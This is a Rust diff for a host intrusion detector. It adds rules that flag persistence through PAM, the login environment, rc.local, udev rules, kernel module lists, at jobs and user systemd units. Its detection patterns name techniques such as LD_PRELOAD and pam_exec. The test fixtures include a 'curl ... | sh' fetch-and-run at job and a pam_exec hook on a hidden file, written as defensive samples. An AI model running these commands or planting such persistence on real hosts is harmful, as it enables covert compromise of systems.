@@ -30,7 +30,161 @@ pub fn evaluate(ev: &FileEvent, ctx: &Ctx) -> Vec<Finding> {
     findings.extend(cron_paths(ev, ctx));
     findings.extend(shell_profiles(ev, ctx));
     findings.extend(systemd_units(ev, ctx));
+    findings.extend(other_surfaces(ev, ctx));
     findings
+}
+
+/// Persistence and login surfaces beyond cron, profiles and units.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Surface {
+    Pam,
+    Environment,
+    RcLocal,
+    Udev,
+    Modules,
+}
+
+fn surface_of(path: &str) -> Option<Surface> {
+    let under = |dir: &str| {
+        path.strip_prefix(dir)
+            .and_then(|r| r.strip_prefix('/'))
+            .is_some_and(|r| !r.is_empty() && !r.contains('/'))
+    };
+    if under("/etc/pam.d") {
+        Some(Surface::Pam)
+    } else if path == "/etc/environment" || path == "/etc/security/pam_env.conf" {
+        Some(Surface::Environment)
+    } else if path == "/etc/rc.local" {
+        Some(Surface::RcLocal)
+    } else if under("/etc/udev/rules.d") && path.ends_with(".rules") {
+        Some(Surface::Udev)
+    } else if path == "/etc/modules" || (under("/etc/modules-load.d") && path.ends_with(".conf")) {
+        Some(Surface::Modules)
+    } else {
+        None
+    }
+}
+
+/// Content that makes a change on this surface clearly dangerous.
+fn surface_red_flag(surface: Surface, content: &str) -> Option<String> {
+    let lines = content
+        .lines()
+        .map(str::trim)
+        .filter(|l| !l.is_empty() && !l.starts_with('#'));
+    let mut hits: Vec<&str> = Vec::new();
+    for l in lines {
+        let hit = match surface {
+            // A preload for every login session.
+            Surface::Environment => l.contains("LD_PRELOAD") || l.contains("LD_AUDIT"),
+            // pam_exec runs a program on every login; a module given by a
+            // path outside the system library dirs is someone's own code.
+            Surface::Pam => {
+                l.contains("pam_exec")
+                    || l.split_whitespace().any(|w| {
+                        w.starts_with('/')
+                            && w.ends_with(".so")
+                            && !w.starts_with("/lib")
+                            && !w.starts_with("/usr/lib")
+                    })
+            }
+            // RUN+= executes a program whenever the device event fires.
+            Surface::Udev => l.contains("RUN+=") || l.contains("RUN="),
+            Surface::RcLocal => looks_like_staging(l),
+            Surface::Modules => false,
+        };
+        if hit {
+            hits.push(l);
+        }
+    }
+    (!hits.is_empty()).then(|| {
+        hits.into_iter()
+            .take(MAX_SHOWN_COMMANDS)
+            .collect::<Vec<_>>()
+            .join(" | ")
+    })
+}
+
+fn other_surfaces(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
+    let surface = surface_of(&ev.path)?;
+    let content = ev.content.as_deref().unwrap_or("");
+    let red_flag = surface_red_flag(surface, content);
+    if red_flag.is_none() && writer_is_installer(ev, ctx) {
+        return None;
+    }
+    let attribution = ctx.attribute(ev);
+    let (what_is, why) = match surface {
+        Surface::Pam => (
+            "PAM configuration",
+            "PAM decides who can log in and runs on every authentication. A changed stack can \
+             accept any password, log credentials, or run a program at each login.",
+        ),
+        Surface::Environment => (
+            "the global login environment",
+            "Variables set here apply to every login session. LD_PRELOAD or LD_AUDIT in it loads \
+             a library into everything users start.",
+        ),
+        Surface::RcLocal => (
+            "rc.local",
+            "rc.local runs as root at every boot. It's an old but still common place to persist.",
+        ),
+        Surface::Udev => (
+            "a udev rule",
+            "udev rules can run programs as root when a device event fires (RUN+=), including \
+             at every boot.",
+        ),
+        Surface::Modules => (
+            "the kernel modules loaded at boot",
+            "A module listed here is loaded into the kernel at every boot. Rootkits persist \
+             this way.",
+        ),
+    };
+    let severity = match (&red_flag, attribution.is_interactive()) {
+        (Some(_), false) => Severity::Critical,
+        (Some(_), true) => Severity::High,
+        (None, false) => Severity::High,
+        (None, true) => Severity::Info,
+    };
+    let title = match (severity, surface) {
+        (Severity::Info, _) => format!("Change to {} during a session", what_is),
+        (_, Surface::Pam) if red_flag.is_some() => {
+            "PAM now runs a program or a non-system module".to_string()
+        }
+        (_, Surface::Environment) if red_flag.is_some() => {
+            "Global environment sets LD_PRELOAD".to_string()
+        }
+        (_, Surface::Udev) if red_flag.is_some() => "udev rule runs a program".to_string(),
+        _ => format!("Change to {} with no session present", what_is),
+    };
+    let mut f = Finding::new(
+        DetectionId::D3,
+        severity,
+        &title,
+        &format!("d3|surface|{}|{}", ev.path, content_tag(content)),
+    )
+    .what(format!(
+        "{} was {} by {}{}.",
+        ev.path,
+        ev.kind.as_str(),
+        writer_label(ev.writer.as_ref()),
+        if attribution.is_interactive() {
+            ""
+        } else {
+            " while no interactive session was active on the host"
+        }
+    ))
+    .fact("Path", &ev.path)
+    .why(why);
+    if let Some(lines) = red_flag {
+        f = f.fact("Lines", lines);
+    }
+    if severity >= Severity::High {
+        f = f.actions([
+            "Review the file against its package default or your last known version.",
+            "Revert anything you didn't change.",
+            "Identify the process that wrote the file.",
+        ]);
+    }
+    Some(f)
 }
 
 /// Writer belongs to a package/config manager - those legitimately touch every
@@ -278,7 +432,15 @@ const CRON_PATHS: &[&str] = &[
     "/var/spool/cron/crontabs",
     "/etc/anacrontab",
     "/var/spool/anacron",
+    // at jobs: Debian keeps them under the cron spool, RHEL in /var/spool/at.
+    "/var/spool/at",
 ];
+
+fn is_at_job(path: &str) -> bool {
+    let name = path.rsplit('/').next().unwrap_or("");
+    (path.starts_with("/var/spool/cron/atjobs/") || path.starts_with("/var/spool/at/"))
+        && !name.starts_with('.')
+}
 
 fn cron_paths(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     let is_cron = CRON_PATHS
@@ -290,8 +452,26 @@ fn cron_paths(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     if ev.path.starts_with("/var/spool/anacron/") {
         return None;
     }
+    let at_job = is_at_job(&ev.path);
+    // at's own bookkeeping (.SEQ, spool dirs) isn't a job.
+    if !at_job
+        && (ev.path.starts_with("/var/spool/cron/atjobs") || ev.path.starts_with("/var/spool/at"))
+    {
+        return None;
+    }
     let system_table = ev.path == "/etc/crontab" || ev.path.starts_with("/etc/cron.d/");
-    let all_commands = cron_commands(ev.content.as_deref().unwrap_or(""), system_table);
+    let content = ev.content.as_deref().unwrap_or("");
+    // An at job is a shell script, not a table: every line is a command.
+    let all_commands: Vec<String> = if at_job {
+        content
+            .lines()
+            .map(str::trim)
+            .filter(|l| !l.is_empty() && !l.starts_with('#'))
+            .map(str::to_string)
+            .collect()
+    } else {
+        cron_commands(content, system_table)
+    };
     let suspicious_cmd = all_commands.iter().any(|c| looks_like_staging(c));
     // Content first: the real `crontab` installs whatever it's fed, so
     // `(crontab -l; echo '* * * * * curl ...|sh') | crontab -` used to pass
@@ -299,7 +479,7 @@ fn cron_paths(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     if !suspicious_cmd {
         // `crontab -e` writes via the crontab binary; anacron updates its own timestamps.
         if let Some(w) = &ev.writer {
-            if (is_system_tool(&w.comm, &w.exe, &["crontab", "anacron"])
+            if (is_system_tool(&w.comm, &w.exe, &["crontab", "anacron", "at", "batch"])
                 || is_user_mgmt_tool(&w.comm, &w.exe))
                 && ctx.tool_exemption_applies(w.pid)
             {
@@ -577,11 +757,26 @@ fn shell_profiles(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     )
 }
 
-fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
-    let in_etc = ev.path.starts_with("/etc/systemd/system/");
-    if !in_etc {
-        return None;
+/// Directories systemd loads units from that we watch: the admin dir, the
+/// vendor dirs (packages only, normally), and per-user unit dirs.
+fn systemd_unit_rest(path: &str) -> Option<&str> {
+    for base in [
+        "/etc/systemd/system/",
+        "/usr/lib/systemd/system/",
+        "/lib/systemd/system/",
+    ] {
+        if let Some(r) = path.strip_prefix(base) {
+            return Some(r);
+        }
     }
+    // ~/.config/systemd/user/ (root's or a user's): started at login.
+    path.split_once("/.config/systemd/user/")
+        .filter(|(home, _)| home == &"/root" || home.starts_with("/home/"))
+        .map(|(_, r)| r)
+}
+
+fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
+    systemd_unit_rest(&ev.path)?;
     let is_unit = [
         ".service",
         ".timer",
@@ -688,9 +883,9 @@ fn systemd_units(ev: &FileEvent, ctx: &Ctx) -> Option<Finding> {
     Some(f)
 }
 
-/// `/etc/systemd/system/<unit>.d/<name>.conf`
+/// `<unit dir>/<unit>.d/<name>.conf`
 pub fn is_systemd_dropin(path: &str) -> bool {
-    let Some(rest) = path.strip_prefix("/etc/systemd/system/") else {
+    let Some(rest) = systemd_unit_rest(path) else {
         return false;
     };
     match rest.split_once('/') {
@@ -891,6 +1086,53 @@ mod tests {
             assert_eq!(alert.severity, Severity::Critical);
             let runs = alert.facts.iter().find(|f| f.label == "Runs").unwrap();
             assert!(runs.value.starts_with("wget"), "{}", runs.value);
+        }
+
+        #[test]
+        fn new_surfaces_are_watched() {
+            let mut eng = engine();
+            let t = Utc::now();
+            base(&mut eng, t);
+            let w = (401, "sh", "/usr/bin/dash");
+            let pam = eng.process(write(
+                t,
+                "/etc/pam.d/sshd",
+                w,
+                "auth optional pam_exec.so /tmp/.k\n@include common-auth\n",
+            ));
+            assert_eq!(d3(&pam), Some(Severity::Critical), "{:?}", pam);
+            let env = eng.process(write(t, "/etc/environment", w, "LD_PRELOAD=/lib/x.so\n"));
+            assert_eq!(d3(&env), Some(Severity::Critical), "{:?}", env);
+            let udev = eng.process(write(
+                t,
+                "/etc/udev/rules.d/99-x.rules",
+                w,
+                "ACTION==\"add\", RUN+=\"/usr/local/bin/x\"\n",
+            ));
+            assert_eq!(d3(&udev), Some(Severity::Critical), "{:?}", udev);
+            let rc = eng.process(write(t, "/etc/rc.local", w, "#!/bin/sh\nexit 0\n"));
+            assert_eq!(d3(&rc), Some(Severity::High), "{:?}", rc);
+            let user_unit = eng.process(write(
+                t,
+                "/home/dev/.config/systemd/user/x.service",
+                w,
+                "[Service]\nExecStart=/dev/shm/x\n",
+            ));
+            assert_eq!(d3(&user_unit), Some(Severity::Critical), "{:?}", user_unit);
+            let vendor = eng.process(write(
+                t,
+                "/usr/lib/systemd/system/y.service",
+                w,
+                "[Service]\nExecStart=/usr/bin/y\n",
+            ));
+            assert_eq!(d3(&vendor), Some(Severity::High), "{:?}", vendor);
+            let at = eng.process(write(
+                t,
+                "/var/spool/cron/atjobs/a00001",
+                w,
+                "#!/bin/sh\ncd /root\ncurl -s http://198.51.100.9/x | sh\n",
+            ));
+            assert_eq!(d3(&at), Some(Severity::Critical), "{:?}", at);
         }
 
         #[test]
